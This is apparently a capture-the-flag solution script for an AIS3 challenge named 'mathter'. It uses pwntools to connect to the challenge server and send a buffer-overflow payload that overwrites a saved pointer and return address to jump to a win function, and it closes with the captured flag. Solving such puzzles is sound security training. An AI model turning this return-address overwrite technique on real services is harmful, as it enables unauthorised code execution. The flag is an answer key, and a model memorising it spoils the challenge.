from pwn import *
context.arch = 'amd64'
#r = process('./mathter')
r = remote('chals1.ais3.org',50001)
r.sendline('q')

win1 = 0x4019B8

input()
payload = b'y'+ b'\x00'*3 + p64(0x000000004bc500) + p64(win1)
r.sendline(payload)
r.interactive()


## AIS3{0mg_k4zm4_mu57_b3_k1dd1ng_m3_2e89c9}